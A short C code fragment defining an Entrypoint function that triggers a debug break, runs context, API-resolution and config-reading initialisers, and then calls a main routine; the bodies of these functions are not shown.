VOID Entrypoint() {

    __debugbreak();
    if (!ContextInit() || !ResolveApi() || !ReadConfig()) {
        return;
    }

    MainRoutine();
}
